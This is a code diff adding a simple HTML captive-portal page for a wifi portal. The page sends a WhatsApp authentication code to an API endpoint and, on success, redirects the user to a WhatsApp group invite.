@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auth code input</title>
+</head>
+<body>
+
+    <h1>Connect to wifi portal</h1>
+    <p>An authentication code was sent to your WhatsApp number.<br>Please enter the code below:</p>
+
+    <form id="auth_code">
+        <label for="auth_code_input">Authentication code:</label>
+        <input type="tel" id="auth_code_input" name="auth_code_input" pattern="[0-9]{6}" required>
+        <label id="auth_code_input_end"></label>
+        
+        <br>
+
+        <small>Before you can connect to the wifi portal,<br>you will be asked to join our WhatsApp group</small>
+        
+        <button type="submit">Join WhatsApp group and connect to wifi</button>
+    </form>
+
+    <script>
+        // You can add JavaScript code here to handle form submission if needed
+        document.getElementById('auth_code').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevents the default form submission behavior
+            
+            var code = document.getElementById('auth_code_input').value;
+         
+            fetch(
+                `https://alg08gxd2k.execute-api.eu-central-1.amazonaws.com/Prod/auth/callback?phone_number=<phone_number>&code=${code}`, 
+                {
+                    method: 'GET',
+                    headers: {'Content-Type': 'application/json'}
+                }
+            ).then(response => {
+                if(response.status == 200){
+                    window.location.href = "https://chat.whatsapp.com/EyqatL2OLb6I2B9XbQ3W1n";
+                }else{
+                    alert("Incorrect Code, try again.")
+                }
+            })
+        });
+    </script>
+
+</body>
+</html>
